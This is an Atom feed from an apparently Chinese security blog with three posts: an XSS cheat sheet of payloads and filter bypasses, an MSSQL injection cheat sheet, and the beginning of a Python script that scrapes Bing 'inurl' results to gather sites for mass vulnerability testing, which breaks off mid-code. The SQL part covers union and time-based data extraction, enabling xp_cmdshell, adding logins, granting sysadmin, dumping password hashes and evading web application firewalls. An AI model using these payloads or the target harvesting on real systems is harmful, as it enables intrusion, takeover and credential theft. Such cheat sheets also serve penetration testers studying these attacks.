<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Myths</title>
  <subtitle>Myt0&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://myt0.com/"/>
  <updated>2017-08-24T16:08:33.780Z</updated>
  <id>http://myt0.com/</id>
  
  <author>
    <name>Myths</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XSS总结</title>
    <link href="http://myt0.com/2017/08/14/xss%E6%80%BB%E7%BB%93/"/>
    <id>http://myt0.com/2017/08/14/xss总结/</id>
    <published>2017-08-14T13:45:37.000Z</published>
    <updated>2017-08-24T16:08:33.780Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>payload在url之中，后台未进行有效处理将payload输出导致js代码执行。<br>js代码可能出现的位置：</p>
<ol>
<li><p>标签之间：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">- 标签之间可以直接执行的：</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>[xss]<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">payload: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">- 有些标签之间不能执行，需要先闭合：</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xmp</span>&gt;</span><span class="tag">&lt;/<span class="name">xmp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noframes</span>&gt;</span><span class="tag">&lt;/<span class="name">noframes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plaintext</span>&gt;</span><span class="tag">&lt;/<span class="name">plaintext</span>&gt;</span></span><br><span class="line">- 出现在<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>之间：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">a=<span class="string">"[xss]"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">payload:</span><br><span class="line">";alert(1)</span><br><span class="line">"<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>alert(1)</span><br></pre></td></tr></table></figure>
</li>
<li><p>标签之内</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">- 文本属性：</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"[xss]"</span> /&gt;</span></span><br><span class="line">payload:</span><br><span class="line">" onmouseover=alert(1)</span><br><span class="line">"/&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">- src/href/action/,img的（dynsrc/lowsrc）等属性：</span><br><span class="line">payload:</span><br><span class="line">javascript:alert(1)</span><br><span class="line">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==  (IE不支持)</span><br><span class="line"></span><br><span class="line">- on*事件：</span><br><span class="line">payload:alert(1)</span><br><span class="line"></span><br><span class="line">- style属性内及css代码之中IE可执行，并且在IE9以上被防御，不适合其他浏览器：</span><br><span class="line">style="width:expression(js代码)"</span><br><span class="line">background-image:url('javascript:alert(2)')</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>经过处理请求，将XSS代码存储到数据库，然后输出到页面。这样导致xss攻击持久存在。通常通过表单提交，有一些服务也通过url提交，甚至有些存在于其他的HTTP头字段之中。<br>通常这种xss存在于个人信息，留言，文章日志等一些功能之中。<br>至于最终js代码存在的位置，我们依然可以根据上面判断。</p>
<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>这种xss是由于前端代码直接将url中的代码输出到页面导致。不与后台进行交互。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例如页面存在：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">payload:</span><br><span class="line">http://hostname/path#alert(1)</span><br></pre></td></tr></table></figure></p>
<p>常见的输入点：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.URL</span><br><span class="line"><span class="built_in">document</span>.URLUnencoded</span><br><span class="line"><span class="built_in">document</span>.location</span><br><span class="line"><span class="built_in">document</span>.referrer</span><br><span class="line"><span class="built_in">window</span>.location</span><br><span class="line"><span class="built_in">window</span>.name</span><br><span class="line"><span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure></p>
<p>常见输出点：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">输出HTML：</span><br><span class="line"><span class="built_in">document</span>.write(x)</span><br><span class="line"><span class="built_in">document</span>.writeln(x)</span><br><span class="line"><span class="built_in">document</span>.body.innerHTML = x</span><br><span class="line"></span><br><span class="line">修改DOM树属性：</span><br><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].action = x (另外还有一些对象的src/href)</span><br><span class="line"><span class="built_in">document</span>.attachEvent(x)</span><br><span class="line"><span class="built_in">document</span>.create...(x)</span><br><span class="line"><span class="built_in">document</span>.execCommand(x)</span><br><span class="line"><span class="built_in">document</span>.body.x</span><br><span class="line"><span class="built_in">window</span>.attachEvent(x)</span><br><span class="line"></span><br><span class="line">修改URL：</span><br><span class="line"><span class="built_in">document</span>.location = x</span><br><span class="line"><span class="built_in">document</span>.location.hostname = x</span><br><span class="line"><span class="built_in">document</span>.location.replace(x)</span><br><span class="line"><span class="built_in">document</span>.location.assign(x)</span><br><span class="line"><span class="built_in">document</span>.URL = x</span><br><span class="line"><span class="built_in">window</span>.navigate(x)</span><br><span class="line"></span><br><span class="line">打开新窗口：</span><br><span class="line"><span class="built_in">document</span>.open(x)</span><br><span class="line"><span class="built_in">window</span>.open(x)</span><br><span class="line"><span class="built_in">window</span>.location.href = x</span><br><span class="line"></span><br><span class="line">直接执行的：</span><br><span class="line"><span class="built_in">eval</span>(x)</span><br><span class="line"><span class="built_in">window</span>.execScript(x)</span><br><span class="line"><span class="built_in">window</span>.setInterval(x)</span><br><span class="line"><span class="built_in">window</span>.setTimeout(x)</span><br></pre></td></tr></table></figure></p>
<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">宽字节编码，同时开启magic_quotes_gpc=On，可通过以下payload绕过</span><br><span class="line">1.php?x=1%81&quot;;alert(1) //当charset=GBK/GB2312等编码</span><br><span class="line">magic_quotes_gpc=On:</span><br><span class="line">1.php?x=&lt;script %00%00%00&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">空格绕过</span><br><span class="line">&lt;img/src=&quot;&quot;onerror=alert(2)&gt;</span><br><span class="line">&lt;svg/onload=alert(2)&gt;&lt;/svg&gt;</span><br><span class="line"></span><br><span class="line">大小写</span><br><span class="line">&lt;SCript&gt;alert(2)&lt;/SCript&gt;</span><br><span class="line"></span><br><span class="line">响应头CRLF关闭浏览器XSS Filter,</span><br><span class="line">头部注入X-XSS-Protection:0</span><br><span class="line">这种情况用于请求的URL链接在相应回来urldecode后导致换行，换行部分形成响应头：</span><br><span class="line">比如：</span><br><span class="line">http://x.com/xx.action?id=%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0ax%3Cscript%3Ealert(1);%3C/script%3Ey</span><br><span class="line">经过urldecode后为：</span><br><span class="line">http://x.com/xx.action?id=</span><br><span class="line">Content-Type: text/html</span><br><span class="line">X-XSS-Protection: 0</span><br><span class="line"></span><br><span class="line">x&lt;script&gt;alert(1);&lt;/script&gt;y</span><br><span class="line"></span><br><span class="line">有些过滤器不检测注释，可用以下代码绕过：</span><br><span class="line">&lt;!--&lt;a href=&quot;--&gt;&lt;img src=x onerror=alert(2)//&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">eval(String.fromCharCode())</span><br><span class="line"></span><br><span class="line">绕过URL过滤：</span><br><span class="line">URL编码</span><br><span class="line">十进制 http://</span><br><span class="line">十六进制 http://0x01.0x01.0x01.0x01</span><br><span class="line">八进制 http://01.01.01.01</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;分类：&quot;&gt;&lt;a href=&quot;#分类：&quot; class=&quot;headerlink&quot; title=&quot;分类：&quot;&gt;&lt;/a&gt;分类：&lt;/h2&gt;&lt;h3 id=&quot;反射型&quot;&gt;&lt;a href=&quot;#反射型&quot; class=&quot;headerlink&quot; title=&quot;反射型&quot;&gt;&lt;/a&gt;反射型&lt;/h
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="xss" scheme="http://myt0.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>MSSQL注入总结</title>
    <link href="http://myt0.com/2017/08/10/sql-server-sqli/"/>
    <id>http://myt0.com/2017/08/10/sql-server-sqli/</id>
    <published>2017-08-10T15:00:00.000Z</published>
    <updated>2017-08-14T13:46:33.152Z</updated>
    
    <content type="html"><![CDATA[<h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>字符型需要先使用单引号闭合</p>
<ul>
<li>‘</li>
<li>and 1=1, and 1=2</li>
<li>WAITFOR DELAY ‘0：0：5’–</li>
<li>‘ and ‘1’=’1</li>
<li>‘ WAITFOR DELAY ‘0：0：5’–</li>
<li>–单行注释，/<em> </em>/为多行注释</li>
<li>可使用注释代替空格</li>
</ul>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>报错型注入利用较为简单，可以直接爆出目标数据，比如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">版本号：</span><br><span class="line">and 1=0/@@version; <span class="comment">--</span></span><br><span class="line">服务器名称：</span><br><span class="line">and 1=0/@@servername; <span class="comment">--</span></span><br><span class="line">当前使用语言：</span><br><span class="line">and 1=0/@@language; <span class="comment">--</span></span><br><span class="line">当前用户的进程ID：</span><br><span class="line">and 1=0/@@spid; <span class="comment">--</span></span><br><span class="line">用户名：</span><br><span class="line">and 1=0/@@user; <span class="comment">--</span></span><br><span class="line"><span class="keyword">select</span> user_name();</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">system_user</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>;</span><br><span class="line">枚举列名：</span><br><span class="line">having 1=1</span><br><span class="line">group by name having 1=1</span><br></pre></td></tr></table></figure></p>
<p>盲注可以通过占用页面上的显示位查询所需数据：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">union两侧的查询语句列数必须相同，且对应列数据类型应该相同或兼容</span><br><span class="line">union <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span> 递增直到不出错即可得到列数</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="string">'test'</span>,<span class="number">2</span>,<span class="literal">null</span> 判断对应列的数据类型</span><br><span class="line">强制类型转换：</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">cast</span>(<span class="string">'333'</span> <span class="keyword">AS</span> <span class="built_in">varchar</span>)</span><br><span class="line">使用<span class="keyword">union</span>检索数据时，可以使用<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>先屏蔽系统的正常数据</span><br><span class="line">获取当前数据库表／列信息：</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">WHERE</span> xtype = <span class="string">'U'</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> syscolumns <span class="keyword">WHERE</span> <span class="keyword">id</span> =(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> sysobjects <span class="keyword">WHERE</span> <span class="keyword">name</span> = <span class="string">'tablenameforcolumnnames'</span>)</span><br><span class="line">检索数据库列表：</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">name</span>,<span class="literal">null</span> <span class="keyword">from</span> master..sysdatabases</span><br><span class="line"><span class="keyword">select</span> DB_NAME(N);</span><br><span class="line">检索目标数据库(此处以dbname代替)的表名：</span><br><span class="line">union <span class="keyword">select</span> <span class="keyword">name</span>,<span class="literal">null</span> <span class="keyword">from</span> dbname..sysobjects <span class="keyword">where</span> xtype=<span class="string">'U'</span><span class="comment">--</span></span><br><span class="line">枚举列名：</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> dbname..syscolumns <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> dbname..sysobjects <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'dbtable'</span>)</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> a.name <span class="keyword">from</span> dbname..syscolumns a,dbname..sysobjects b <span class="keyword">where</span> b.name=<span class="string">'dbtable'</span> <span class="keyword">and</span> a.id=b.id<span class="comment">--</span></span><br><span class="line">查询数据：</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,column1,column2 <span class="keyword">from</span> dbname..tablename<span class="comment">--</span></span><br><span class="line">错误信息：</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> master..sysmessages</span><br></pre></td></tr></table></figure></p>
<p>而当页面不能显示所需数据时，可以采用延迟时间来推测，sql server基于时间的注入主要是利用waitfor delay制造延迟，并配合条件语句来逐步推出目标数据，例如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">判断权限：</span><br><span class="line">if (system_user='sa') waitfor delay '0：0：5' <span class="comment">--</span></span><br><span class="line"></span><br><span class="line">检测version返回第25个字符是否等于5：</span><br><span class="line">if (substring((<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">25</span>,<span class="number">1</span>)) = <span class="number">5</span>) waitfor delay <span class="string">'0：0：5'</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<h3 id="数据库不同权限的利用方式"><a href="#数据库不同权限的利用方式" class="headerlink" title="数据库不同权限的利用方式"></a>数据库不同权限的利用方式</h3><p>权限判断：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db_owner判断：</span><br><span class="line">' and 1=(<span class="keyword">select</span> is_member(<span class="string">'db_owner'</span>)) <span class="keyword">and</span> <span class="string">'1'</span>!&gt;<span class="string">'3</span><br><span class="line">sa判断：</span><br><span class="line">select IS_SRVROLEMEMBER('</span>sysadmin<span class="string">')</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>如果是sa权限可以尝试存储过程直接提权，public则尽量获取数据库信息找后台突破</li>
</ul>
<p>存储过程：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell 'dir'</span><br><span class="line">exec master.dbo.xp_cmdshell 'cmd.exe dir c：'</span><br><span class="line">exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'</span><br><span class="line">exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'</span><br><span class="line">xp_regaddmultistring</span><br><span class="line">xp_regdeletekey</span><br><span class="line">xp_regdeletevalue</span><br><span class="line">xp_regenumkeys</span><br><span class="line">xp_regenumvalues</span><br><span class="line">xp_regread</span><br><span class="line">xp_regremovemultistring</span><br><span class="line">xp_regwrite</span><br><span class="line">xp_servicecontrol</span><br><span class="line">xp_availablemedia</span><br><span class="line">xp_enumdsn</span><br><span class="line">xp_loginconfig</span><br><span class="line">xp_makecab</span><br><span class="line">xp_ntsec_enumdomains</span><br><span class="line">xp_terminate_process</span><br><span class="line">重新启动xp_cmdshell：</span><br><span class="line">master..sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',1</span><br><span class="line">reconfigure</span><br><span class="line">master..sp_configure '</span>xp_cmdshell<span class="string">',1</span><br><span class="line">reconfigure</span></span><br></pre></td></tr></table></figure></p>
<p>用户操作：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">增加用户：</span><br><span class="line">exec sp_addlogin 'user', 'pass';</span><br><span class="line">删除用户：</span><br><span class="line">exec sp_droplogin 'user';</span><br><span class="line">查询用户：</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> master..syslogins</span><br><span class="line">#MSSQL <span class="number">2000</span>：</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>, <span class="keyword">password</span> <span class="keyword">from</span> master..sysxlogins</span><br><span class="line">#MSSQL <span class="number">2005</span>：</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>, password_hash <span class="keyword">from</span> master.sys.sql_logins</span><br><span class="line">赋予管理员角色：</span><br><span class="line">exec master.dbo.sp_addsrvrolemember <span class="string">'user'</span>, <span class="string">'sysadmin;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="一些WAF绕过方式"><a href="#一些WAF绕过方式" class="headerlink" title="一些WAF绕过方式"></a>一些WAF绕过方式</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">代替空格：</span><br><span class="line">id=1+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/*</span><br><span class="line">%0b代替：</span><br><span class="line">id=1+uni%0bon+se%0blect+1,2,3--</span><br><span class="line">%09 %0A %0B %0C %0D %A0都可代替空格</span><br><span class="line">注释混淆：</span><br><span class="line">id=1/*union*/</span><span class="keyword">union</span><span class="comment">/*select*/</span><span class="keyword">select</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/*</span><br><span class="line">id=1+un/**/</span>ion+sel<span class="comment">/**/</span>ect+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/*&amp;id=*/</span><span class="keyword">select</span><span class="comment">/*&amp;id=*/</span>pwd<span class="comment">/*&amp;id=*/</span><span class="keyword">from</span><span class="comment">/*&amp;id=*/</span><span class="keyword">users</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/*,*/</span><span class="keyword">select</span><span class="comment">/*,*/</span>pwd<span class="comment">/*,*/</span><span class="keyword">from</span><span class="comment">/*,*/</span><span class="keyword">users</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span> <span class="comment">/*!union*/</span> <span class="comment">/*!select*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--（mysql）</span></span><br><span class="line">大小写混淆：</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span>+<span class="keyword">UnIoN</span><span class="comment">/**/</span><span class="keyword">SeLecT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span>+<span class="keyword">OR</span>+<span class="number">0x50</span>=<span class="number">0x50</span></span><br><span class="line">针对<span class="keyword">replace</span>过滤关键词的：</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span>+UNunionION+SEselectLECT+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br><span class="line">使用长输入造成溢出：</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span>)=(<span class="keyword">Select</span> <span class="number">0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>–</span><br><span class="line"><span class="keyword">url</span>编码：</span><br><span class="line"><span class="keyword">union</span>%<span class="number">2520</span><span class="keyword">select</span>%<span class="number">25201</span>,%<span class="number">2</span>f%<span class="number">2</span>a%<span class="number">21</span>table_name%<span class="number">2</span>a%<span class="number">2</span>f%<span class="number">2520</span>,<span class="number">3</span> </span><br><span class="line">宽字节编码</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;检测方法&quot;&gt;&lt;a href=&quot;#检测方法&quot; class=&quot;headerlink&quot; title=&quot;检测方法&quot;&gt;&lt;/a&gt;检测方法&lt;/h3&gt;&lt;p&gt;字符型需要先使用单引号闭合&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;‘&lt;/li&gt;
&lt;li&gt;and 1=1, and 1=2&lt;/li&gt;
&lt;l
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="sqli" scheme="http://myt0.com/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>python爬取inurl查询关键字的bing结果</title>
    <link href="http://myt0.com/2017/06/22/spider-bing-url-search-result-with-python/"/>
    <id>http://myt0.com/2017/06/22/spider-bing-url-search-result-with-python/</id>
    <published>2017-06-22T15:02:12.000Z</published>
    <updated>2017-06-26T13:28:30.706Z</updated>
    
    <content type="html"><![CDATA[<p>为了测试某个漏洞，比如struts2漏洞，我们可能会批量抓取搜索引擎结果来测试，这里简单演示用python脚本来爬取这些bing搜索结果的url，其他搜索引擎类似</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">search_bing</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, q, page=<span class="number">1</span>, file=<span class="string">''</span>)</span>:</span></span><br><span class="line">        self.wd = q 